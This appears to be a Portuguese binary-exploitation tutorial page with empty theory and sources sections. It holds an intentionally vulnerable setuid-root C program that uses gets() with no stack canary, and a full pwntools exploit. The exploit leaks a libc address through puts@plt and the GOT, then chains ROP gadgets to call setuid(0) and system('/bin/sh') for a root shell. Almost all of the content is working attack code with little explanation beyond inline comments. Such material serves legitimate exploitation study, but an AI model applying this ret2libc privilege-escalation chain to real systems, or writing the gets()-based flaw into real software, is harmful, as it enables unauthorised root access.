- [Teoria](#teoria)
- [Exemplo](#exemplo)
  - [vuln.c](#vulnc)
  - [exploit](#exploit)
- [Fontes e Recursos Adicionais](#fontes-e-recursos-adicionais)

# Teoria

# Exemplo
## vuln.c
```c
#include <stdio.h>
/*
gcc vuln.c -fno-stack-protector -no-pie -ggdb -z relro -z now -o vuln;
sudo chown root vuln ; sudo chmod +s vuln;
checksec vuln;
*/

/* 
O checksec deve dar:
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
*/
void vuln() {
    puts("Ola :D ! Qual o seu nome?");

    char buffer[20];
    gets(buffer);
}

int main() {
    vuln();

    return 0;
}
```
## exploit
```py
#!/usr/bin/python3
from pwn import *
from time import sleep

context.binary = elf = ELF("vuln")
libc = elf.libc
rop = ROP(elf)
io = process(elf.path)
io.recvline()

if args.SLEEP: sleep(5)

##################################################
# 
# A plt nao tem seu endereco afetado pelo ASLR
# 
# Entao podemos chamar uma funcao do libc por 
# meio dela, sem precisar de leak
#
# Assim, vamos chamar puts por meio da plt!
#
# Alem disso, a got tambem nao e afetada,
# e ela armazena o endereco das funcoes resolvidas
#
# E oq o puts vai printar? um valor da got!
# Assim, nos dando o leak do libc
#
##################################################

payload = b'A'*40 + flat(
    rop.find_gadget(['pop rdi', 'ret']).address,
    elf.got.puts,
    elf.plt.puts, # call puts("got.puts")
    elf.sym.vuln  # voltar pra vuln 
)

io.sendline(payload)

##################################################
#
# Receber leak
#
##################################################

libc.address = int(bytearray(
    io.recvline()[:-1:])[::-1].hex(),
    16) - libc.sym.puts

# >>> leak                                      # Botei um valor qualquer 
#     b'\xf0\xb5[\x16\xc8\x7f\n'
#
# >>> leak[:-1:]                                # Remover \n
#     b'\xf0\xb5[\x16\xc8\x7f'
#
# >>> bytearray(leak[:-1:]).hex()               # converter pra hexstring
#     'f0b55b16c87f'
#
# >>> bytearray(leak[:-1:])[::-1].hex()         # Little Endian
#     '7fc8165bb5f0'
#
# >>> int(bytearray(leak[:-1:])[::-1].hex(),16) # int
#     140497345295856

# Em seguida, leak - offset_puts ===> base_libc

log.success("Libc Leak: "+hex(libc.address))

##################################################
#
# vuln parte 2, o retorno
#
##################################################

io.recvline()

payload = b'A'*40 + flat(
    # Privesc
    rop.find_gadget(['pop rdi', 'ret']).address,
    0,
    libc.sym.setuid,
    
    # System
    rop.find_gadget(['pop rdi', 'ret']).address,
    next(libc.search(b"/bin/sh\x00")),
    libc.sym.system,

    # Exit
    rop.find_gadget(['pop rdi', 'ret']).address,
    0,
    libc.sym.exit
)

io.sendline(payload)
io.interactive()
```
# Fontes e Recursos Adicionais
